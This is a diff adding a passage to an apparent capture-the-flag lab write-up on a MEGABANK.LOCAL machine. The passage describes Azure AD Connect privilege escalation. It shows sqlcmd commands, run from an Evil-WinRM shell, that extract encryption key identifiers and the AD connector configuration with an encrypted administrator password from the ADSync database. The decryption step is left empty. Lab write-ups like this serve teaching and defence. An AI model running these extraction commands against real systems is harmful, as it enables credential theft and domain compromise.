@@ -313,6 +313,83 @@ NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10        
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 ```
 
+I can see the user is a member of the `Azure Admins` group.
+
+## Azure AD - Privilege Escalation
+
+This [post](https://blog.xpnsec.com/azuread-connect-for-redteam/) covers exploiting Azure AD connect. The idea is that there is a user that is setup to handle replication of Active Directory to Azure. In the default case, that’s an account named like MSOL_[somehex]. I’ll see shortly that’s not the case here.
+
+It turns out mhope is able to connect to the local database and pull the configuration. I can then decrypt it and get the username and password for the account that handles replication.
+
+The exploit breaks down into three parts:
+
+1. Get the information from the DB to retrieve the encryption keys from the KeyManager.
+2. Get the config and encrypted password from the DB.
+3. Fetch the keys and decrypt the password.
+
+### 1. Get the information from the DB to retrieve the encryption keys from the KeyManager.
+
+Use `sqlcmd` to get the information from the DB to retrieve the encryption keys from the KeyManager.
+
+```bash
+*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -d ADSync -Q 'SELECT keyset_id, instance_id, entropy FROM mms_server_configuration'
+
+keyset_id   instance_id                          entropy
+----------- ------------------------------------ ------------------------------------
+          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
+```
+
+### 2. Get the config and encrypted password from the DB.
+
+Use `sqlcmd` to get the config information:
+
+```bash
+*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -y0 -d ADSync -Q 'SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = "AD"'
+<adma-configuration>
+ <forest-name>MEGABANK.LOCAL</forest-name>
+ <forest-port>0</forest-port>
+ <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
+ <forest-login-user>administrator</forest-login-user>
+ <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
+ <sign-and-seal>1</sign-and-seal>
+ <ssl-bind crl-check="0">0</ssl-bind>
+ <simple-bind>0</simple-bind>
+ <default-ssl-strength>0</default-ssl-strength>
+ <parameter-values>
+  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
+  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
+  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
+  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
+  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
+  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
+  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
+  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
+  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
+  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
+  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
+  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
+  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
+  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
+  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
+</parameter-values>
+ <password-hash-sync-config>
+            <enabled>1</enabled>
+            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
+         </password-hash-sync-config>
+</adma-configuration> 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
+```
+
+The encrypted password is there at the bottom.
+
+
+### 3. Fetch the keys and decrypt the password.
+
+
+
+
 
 ## Bloodhound
 
